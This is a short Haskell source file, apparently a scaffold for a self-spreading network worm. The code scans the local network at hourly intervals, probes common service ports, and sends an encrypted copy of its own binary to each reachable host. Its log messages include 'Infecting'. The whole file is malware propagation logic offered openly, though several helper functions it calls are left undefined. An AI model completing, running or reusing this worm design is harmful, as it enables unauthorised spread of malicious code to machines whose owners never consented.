-- WormPropagation.hs
-- Auto-generated scaffold.

module Network.WormPropagation where

import Network.Socket
import Network.BSD
import Network.Socket.ByteString
import Data.ByteString as BS
import Control.Concurrent
import Control.Monad
import System.Process
import System.Random
import Data.List
import Data.Char

networkPropagationLoop :: IO ()
networkPropagationLoop = do
    targets <- scanLocalNetwork
    mapM_ infectTarget targets
    threadDelay 3600000000  -- هر 1 ساعت
    networkPropagationLoop

scanLocalNetwork :: IO [String]
scanLocalNetwork = do
    interfaces <- getNetworkInterfaces
    let baseIPs = map getBaseIP interfaces
    allIPs <- mapM generateIPRange baseIPs
    return $ concat allIPs

infectTarget :: String -> IO ()
infectTarget ip = do
    putStrLn $ "🔍 Scanning " ++ ip
    openPorts <- scanPorts ip [21, 22, 80, 443, 3389]
    if null openPorts
        then return ()
        else do
            putStrLn $ "🎯 Infecting " ++ ip
            wormBinary <- getSelfBinary
            encryptedWorm <- encryptWorm wormBinary
            sendWorm ip (head openPorts) encryptedWorm

sendWorm :: String -> PortNumber -> BS.ByteString -> IO ()
sendWorm ip port worm = withSocketsDo $ do
    sock <- socket AF_INET Stream 0
    addr <- inet_addr ip
    connect sock (SockAddrInet port addr)
    sendAll sock worm
    close sock
    